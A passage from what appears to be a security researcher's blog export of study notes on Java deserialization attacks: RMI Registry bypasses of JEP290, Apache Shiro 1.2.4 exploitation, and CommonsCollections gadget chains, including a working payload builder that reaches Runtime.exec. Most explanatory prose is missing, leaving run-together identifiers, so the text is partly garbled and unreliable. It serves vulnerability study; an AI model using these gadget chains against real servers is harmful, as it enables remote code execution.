class="title">ActivationID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)</span></span><br><span class="line"><span class="class">        || <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">server</span>.<span class="title">UID</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x02AnnotationInvocationHandlerysoserialysoserial.exploit.RMIRegisterExploit<a href="http://www.codersec.net/2018/09/rmi/" target="_blank" rel="noopener">3</a></p><p></p><p>RemoteUnicastRef</p><h3 id="1-UnicastRef"><a href="#1-UnicastRef" class="headerlink" title="1. UnicastRef"></a>1. UnicastRef</h3><p>RMI</p><p>bindRegistry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">"192.168.98.80"</span>);</span><br></pre></td></tr></table></figure><p><code>java/rmi/registry/LocateRegistry.java#getRegistry</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131185848839.png" alt="image-20200131185848839"></p><p>TCPEndpointhostUnicastRefliveRef.createProxyRemoteObjectInvocationHandlerUnicastRef</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131191232156.png" alt="image-20200131191232156"></p><p>Registry<code>sun/rmi/registry/RegistryImpl_Stub.java#bind</code>RMI Registry</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131231355987.png" alt="image-20200131231355987"></p><p>newCall</p><p>RegistryUnicastRefUnicastRefLiveRefhostportRMIysoserialJRMPClientpayload</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200131232428711.png" alt="image-20200131232428711"></p><p>XDUnicastRef</p><h3 id="2-RemoteObjectInvocationHandler"><a href="#2-RemoteObjectInvocationHandler" class="headerlink" title="2. RemoteObjectInvocationHandler"></a>2. RemoteObjectInvocationHandler</h3><p>UnicastRefRMIRemoteUnicastRefRemoteUnicastRef</p><ol><li>RMIRegisterExploitProxyhandlerRemoteUnicastRefRemoteObjectInvocationHandler</li><li>UnicastRefRemote</li></ol><p>JRMPClientRemoteObjectInvocationHandlerAnnotationInvocationHandlerRemoteObjectInvocationHandlerRemoteObjectInvocationHandlerRemoteObjectreadObject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220005786.png" alt="image-20200110220005786"></p><p>refUnicastRefreadExternalreadExternal</p><blockquote><p>Java ExternalizableSerializable<br>Externalizableextends SerializablewriteExternal()readExternal()</p><p><a href="https://xz.aliyun.com/t/5392" target="_blank" rel="noopener">https://xz.aliyun.com/t/5392</a></p></blockquote><p>readExternaltcp</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220105735.png" alt="image-20200110220105735"></p><p></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220150019.png" alt="image-20200110220150019"></p><p>LiveRefConnectionInputStreamstreamregisterRefs</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220710690.png" alt="image-20200110220710690"></p><p>DGCClientloopup</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200110220823670.png" alt="image-20200110220823670"></p><p>JRMPListener</p><h3 id="3-RMIConnectionImpl-Stub"><a href="#3-RMIConnectionImpl-Stub" class="headerlink" title="3. RMIConnectionImpl_Stub"></a>3. RMIConnectionImpl_Stub</h3><p>RemoterefRMIConnectionImpl_Stub</p><p>RemoteObjectInvocationHandlerRemoteObjectreadObjectRMIConnectionImpl_StubRemoteObject</p><p><code>DGCImpl_Stub</code><code>RMIServerImpl_Stub</code><code>RegistryImpl_Stub</code><code>ReferenceWrapper_Stub</code></p><h3 id="20200616-trick"><a href="#20200616-trick" class="headerlink" title="20200616 trick"></a>20200616 trick</h3><p>2UnicastRefrefConnectionInputStreamincomingRefTableStreamRemoteCallreleaseInputStreamjrmp</p><p>UnicastRef3UnicastRefUnicastRef</p><p>readObject</p><p>UnicastRef<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/java/rmi/RMIConnectWrapped.java" target="_blank" rel="noopener">RMIConnectWrapped</a></p><h2 id="0x04--jdk-gt-8u232-b09"><a href="#0x04--jdk-gt-8u232-b09" class="headerlink" title="0x04  jdk&gt;=8u232_b09"></a>0x04  jdk&gt;=8u232_b09</h2><p>jdk8u232_b09JRMP</p><h3 id="RegistryImpl-Skel"><a href="#RegistryImpl-Skel" class="headerlink" title="RegistryImpl_Skel"></a>RegistryImpl_Skel</h3><p><code>sun.rmi.registry.RegistryImpl_Skel#dispatcher</code>lookupbind/rebind</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512145332476.png" alt="image-20200512145332476"></p><p><code>call.discardPendingRefs</code>JRMPJRMP</p><h3 id="DGCImpl-Stub"><a href="#DGCImpl-Stub" class="headerlink" title="DGCImpl_Stub"></a>DGCImpl_Stub</h3><p>RegistryJRMP<code>DGCImpl_Stub#dirty</code><code>ref.invoke</code><code>sun.rmi.transport.StreamRemoteCall#executeCall</code>(0x05)</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512145824806.png" alt="image-20200512145824806"></p><p>232<code>leaseFilter</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200512150213665.png" alt="image-20200512150213665"></p><p><code>sun/rmi/transport/DGCImpl_Stub.java#leaseFilter</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200118182504042.png" alt="image-20200118182504042"></p><p>HashSetHashTable</p><p>Registry</p><p>ps:<code>DGCImpl_Stub</code>serverClient<code>DGCImpl_Skel</code>skel0x08</p><h2 id="0x05-ysoserialJRMPListenerJRMPClient"><a href="#0x05-ysoserialJRMPListenerJRMPClient" class="headerlink" title="0x05 ysoserialJRMPListenerJRMPClient"></a>0x05 ysoserialJRMPListenerJRMPClient</h2><p>serverRMIjava</p><p>RMI RegistryRMI ClientServerRMI</p><p>JRMPListenerRMI Client</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200202161819982.png" alt="image-20200202161819982"></p><p>ListenerClientExceptionalReturnpayloadBadAttributeValueExpExceptionvalBadAttributeValueExpExceptiontoStringpayloadBadAttributeValueExpExceptionvalpayload</p><p>ClientExceptionalReturn<code>sun/rmi/transport/StreamRemoteCall.java#executeCall</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200202163234429.png" alt="image-20200202163234429"></p><p>readObjectException</p><p>ClientRMIListenerListenerExceptionClientExceptionalReturnRMI Client</p><h2 id="0x06-"><a href="#0x06-" class="headerlink" title="0x06 "></a>0x06 </h2><p>RMIRMI RegistryRMI Client</p><p>JDKJDK8JDK8uRMI RegistryJDK8u232_b09</p><p>RMI RegistryRMI</p><ol><li>codebase<a href="https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.mdclass" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/java/rmi-codebase/README.mdclass</a></li><li>objlistobjhello(HashTable xxx)HashTableCommonsCollections7xxxRMI Serverpayload</li></ol><h2 id="0x07-20200303-UnicastRemoteObject-Gadget"><a href="#0x07-20200303-UnicastRemoteObject-Gadget" class="headerlink" title="0x07 20200303 UnicastRemoteObject Gadget"></a>0x07 20200303 UnicastRemoteObject Gadget</h2><p>Gadget<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p><p>GadgetJRMPClientLevel2</p><p>bindrebindRemotesun/rmi/server/MarshalOutputStream.java#replaceObject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200303203244913.png" alt="image-20200303203244913"></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200303203931864.png" alt="image-20200303203931864"></p><p>UnicastRemoteObjectRegistryUnicastRemoteObjectreadObjectGadget</p><p>bindgetTargetGadgetXD</p><p>psXD</p><h3 id="20200617-UnicastRemoteObject-Gadget"><a href="#20200617-UnicastRemoteObject-Gadget" class="headerlink" title="20200617 UnicastRemoteObject Gadget"></a>20200617 UnicastRemoteObject Gadget</h3><p>UnicastRefRegistryjrmp</p><p><code>java.io.ObjectOutputStream#writeObject0#1143</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">  Object rep = replaceObject(obj);</span><br><span class="line">  <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">    cl = rep.getClass();</span><br><span class="line">    desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  obj = rep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>call.getOutputStream()</code>outputstreamobjectenableReplacetrue3jrmp</p><p>enableReplacefalseoutputstreamtruefalse<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/exploit/rmi/component/Naming.java#L34" target="_blank" rel="noopener">L34</a></p><p></p><ol><li>UnicastRemoteObjectRegistry</li><li>unicastrefUnicastRemoteObjectjrmpincomingtablejrmp</li></ol><p>&gt;=8u232_b090x04</p><ol><li>unicastRef</li><li>DGCjrmp</li></ol><p>UnicastRemoteObject</p><ol><li><p>UnicastRemoteObjectjrmpreadObject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200617230402963.png" alt="image-20200617230402963"></p></li><li><p>RegistryJRMP<code>DGCClient.registerRefs</code></p><p>DGCDGCClient</p><p>&lt;8u232_b09RemoteObjectInvocationHandlerUnicastRefUnicastRef.invokeUnicastRemoteObjecthandler<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200617234429050.png" alt="image-20200617234429050"></p><p><code>ref.invoke</code>jrmpDGCClient</p></li></ol><p>8u242lookupstringobject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200618002342127.png" alt="image-20200618002342127"></p><h2 id="0x08-RMI-DGC-ysoserial-expliots-JRMPClient"><a href="#0x08-RMI-DGC-ysoserial-expliots-JRMPClient" class="headerlink" title="0x08 RMI DGC(ysoserial.expliots.JRMPClient)"></a>0x08 RMI DGC(ysoserial.expliots.JRMPClient)</h2><p>JEP290RMIDGCImpl_skel#dipatchreadObject</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202106633.png" alt="image-20200306202106633"></p><p>JEP290DGCImpl</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202539911.png" alt="image-20200306202539911"></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200306202604696.png" alt="image-20200306202604696"></p><p>ysoserialexploitJRMPClient</p><h2 id="0x09-20200317-"><a href="#0x09-20200317-" class="headerlink" title="0x09 20200317 "></a>0x09 20200317 </h2><p></p><p><code>sun/rmi/server/UnicastServerRef.java#dispatch#338</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203347230.png" alt="image-20200317203347230"></p><p>ClientServerRMIServerMethtodparametersinvokeparamsRMI338</p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203723497.png" alt="image-20200317203723497"></p><p><code>unmarshalParametersUnchecked</code></p><p><img src="/images/rmi-registry-security-problem-20200206/image-20200317203838431.png" alt="image-20200317203838431"></p><p>readObjectfilter</p><p>ServerObjectHashTableServer</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJavaShiro</title>
      <link href="2019/11/10/java/study-java-deserialized-shiro-1-2-4/"/>
      <url>2019/11/10/java/study-java-deserialized-shiro-1-2-4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>commons-collectionspayloadshiro</p><a id="more"></a><p>xxctfshirotomcatshiro<code>commons-collections:3.2.1</code></p><p>commons-collections</p><p>shiro-1.2.4ysoserial</p><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><p><a href="!https://github.com/apache/shiro">shiro-root-1.2.4</a>samples/webclone<code>git checkout shiro-root-1.2.4</code></p><p><a href="!https://blog.knownsec.com/2016/08/apache-shiro-java/"></a></p><p>ysoserial0.0.6<code>https://github.com/frohoff/ysoserial</code></p><p></p><ol><li><p><a href="https://stackoverflow.com/questions/8701307/the-absolute-uri-http-java-sun-com-jsp-jstl-core-cannot-be-resolved-in-either" target="_blank" rel="noopener">The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application</a></p><p>pom.xml</p></li></ol><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191108153248897.png" alt="image-20191108153248897"></p><p>            jstl</p><ol start="2"><li><p>serialVersionUID</p><p>ysoserialserialVersionUID<a href="http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/" target="_blank" rel="noopener"></a><code>commons-collections:3.2.1</code>warpom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><p>16shirokey</p><ul><li>1.<a href="https://blog.knownsec.com/2016/08/apache-shiro-java/" target="_blank" rel="noopener">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li>2.<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a></li><li>3.<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>1<code>commons-collections:4.0</code>tomcat<code>commons-collections:3.2.1</code></p><p><code>org.apache.shiro.io.DefaultSerializer.deserialize:67</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109160945448.png" alt="image-20191109160945448"></p><p>75<code>ClassResolvingObjectInputStream</code><code>ObjectInputStream</code>.<code>ObjectInputStream</code><code>resolveClass</code><a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/"></a>Java<code>ObjectInputStream</code><code>resolveClass</code><code>Class.forName</code>Class<code>resolveClass</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109162524242.png" alt="image-20191109162524242"></p><p><code>ClassUtils.forName</code>forName</p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109163048059.png" alt="image-20191109163048059"></p><p><code>ExceptionIgnoringAccessor</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191109164548583.png" alt="image-20191109164548583"></p><p><code>ParallelWebAppClassLoader</code><code>WebappClassLoaderBase</code><code>loadClass</code><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110110209579.png" alt="image-20191110110209579"></p><p>loadClass<code>org.apache.catalina.loader.WebappClassLoaderBase.loadClass</code>cache3<code>URLClassLoader</code><code>loadClass</code>loadClassname<code>/Lorg/apache/commons/collections/Transformer;.class</code>shiro</p><p><code>commons-collections:3.2.1</code></p><p><code>commons-collections:4.0</code>ysoserial<code>CommonsCollections2</code><code>CommonsCollections2</code>shiro</p><p><code>commons-collections:3.2.1</code></p><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><p>0x02<code>ChainedTransformer</code><code>iTransformers</code><code>Transformers</code><code>ClassNotFoundException</code></p><p>commons-collectionspayload<code>ChainedTransformer</code><code>TemplatesImpl.newTransformer</code><code>loadClass</code>evil class bytes</p><p><code>TemplatesImpl.newTransformer</code></p><p><code>CommonsCollections2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>TransformingComparator3.2.1Serializable3.2.1payload</p><p><code>InvokerTransformer.transform()</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110141818530.png" alt="image-20191110141818530"></p><p><code>input</code><code>iMethodName</code><code>input</code><code>TemplatesImpl</code></p><p><code>iMethodName</code><code>newTransformer</code>templates gadgets</p><p><code>input</code><code>TemplatesImpl</code></p><p>ysoserial<code>transform</code><code>input</code></p><h3 id="1-ChainedTransformer"><a href="#1-ChainedTransformer" class="headerlink" title="1.ChainedTransformer"></a>1.<code>ChainedTransformer</code></h3><p><code>InvokerTransformer</code><code>ChainedTransformer</code>Runtimt.getRuntime().exec</p><h3 id="2-String"><a href="#2-String" class="headerlink" title="2.String"></a>2.<code>String</code></h3><p><code>String</code><code>ConstantTransformer.transform</code><code>input</code><code>transform</code><code>input</code><code>iConstant</code></p><p><code>String</code></p><p><code>CommonsCollection5</code><code>TiedMapEntry</code><code>LazyMap</code>map<code>get</code></p><p></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143619051.png" alt="image-20191110143619051"></p><p><code>map</code><code>key</code><code>LazyMap.get</code><code>transform</code><code>key</code><code>transform</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110143737549.png" alt="image-20191110143737549"></p><p><code>TemplatesImpl</code>key<code>InvokerTransformer.transform</code><code>input</code>templates gadgets</p><p><code>CommonsCollections5,6,9</code><code>TiedMapEntry</code>key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); //</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br></pre></td></tr></table></figure><p><code>foo</code><code>TemplatesImpl.newTransformer</code>trigger</p><p><code>TiedMapEntry</code>shiro</p><h4 id="20200108"><a href="#20200108" class="headerlink" title="20200108"></a>20200108</h4><p>createTemplatesImplbyte[]evil classtomcat 7javatomcat6tomcat6</p><h3 id="20200109"><a href="#20200109" class="headerlink" title="20200109"></a>20200109</h3><p>security manager<code>-Djdk.xml.enableTemplatesImplDeserialization=true</code></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20200109193558744.png" alt="image-20200109193558744"></p><h1 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h1><p><code>HashSet</code>exp<a href="https://github.com/wh1t3p1g/ysoserial" target="_blank" rel="noopener">MyYsoserial</a><code>CommonsCollections10</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);<span class="comment">// evil class bytesTemplatesImpl</span></span><br><span class="line"><span class="comment">// InvokerTransformertoString</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="comment">// LazyMapfactoryInvokerTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"><span class="comment">// TiedMapEntrymaplazyMapkeyTemplatesImpl</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line"><span class="comment">// entryHashSetnodekeyHashSetputTiedMapEntryhashCode</span></span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("map");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f);</span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(f2);</span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Reflections.setAccessible(keyField);</span><br><span class="line">keyField.set(node, entry);</span><br><span class="line"><span class="comment">// newTransformerInvokerTransformer</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashSet.readObject()</span><br><span class="line">-&gt; java.util.HashMap.put()</span><br><span class="line">-&gt; java.util.HashMap.hash()</span><br><span class="line">-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">-&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">-&gt; org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">-&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">-&gt; java.lang.reflect.Method.invoke()</span><br><span class="line">      ... templates gadgets ...</span><br><span class="line">      -&gt; java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><h1 id="0x05-"><a href="#0x05-" class="headerlink" title="0x05 "></a>0x05 </h1><p><code>CommonsCollections</code>shirotomcatshiro<code>commons-collections:3.2.1</code></p><p><a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">shiro-721</a></p><p><img src="/images/study-java-deserialized-shiro-1-2-4-20191110/image-20191110151222301.png" alt="image-20191110151222301"></p><p>Happy Hacking XD</p><hr>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJavaCommonsCollections2,4,8</title>
      <link href="2019/11/05/java/study-java-deserialized-commonscollections4/"/>
      <url>2019/11/05/java/study-java-deserialized-commonscollections4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>CommonsCollections:3.2.1CommonsCollections:4.0CommonsCollections248</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><p>commons-collections:4.03.2.23.2.1<br>CommonsCollections5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map&lt;String, String&gt; innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>innerMapLazyMapCommonsCollections3<code>TrAXFilter</code>class bytes</p><p>commons-collections:4.0TemplatesImpl</p><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><h2 id="1-CommonsCollections2-4"><a href="#1-CommonsCollections2-4" class="headerlink" title="1. CommonsCollections2,4"></a>1. CommonsCollections2,4</h2><p>CommonsCollections2,4<code>PriorityQueue</code><code>Comparator</code><code>transform</code>Transformer<code>PriorityQueue.readObject</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144356952.png" alt="image-20191105144356952"></p><p><code>heapify()</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144742407.png" alt="image-20191105144742407"></p><p><code>siftDown</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105144814493.png" alt="image-20191105144814493"></p><p><code>comparator</code>compare<code>siftDownUsingComparator</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105145042981.png" alt="image-20191105145042981"></p><p>comparatorcompare<code>TransformingComparator</code>,compare</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105145452819.png" alt="image-20191105145452819"></p><p>transformertransformtransform4.0transformer</p><ol><li><p>CommonsCollections2</p><p>CommonsCollections2InvokerTransformertransformtemplates gadget    <code>TemplatesImpl.newTransformer</code></p></li><li><p>CommonsCollections4</p><p>CommonsCollections4CommonsCollections3<code>InstantiateTransformer</code><code>TrAXFilter</code><code>TemplatesImpl.newTransformer</code></p></li></ol><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollection2:</span><br><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; 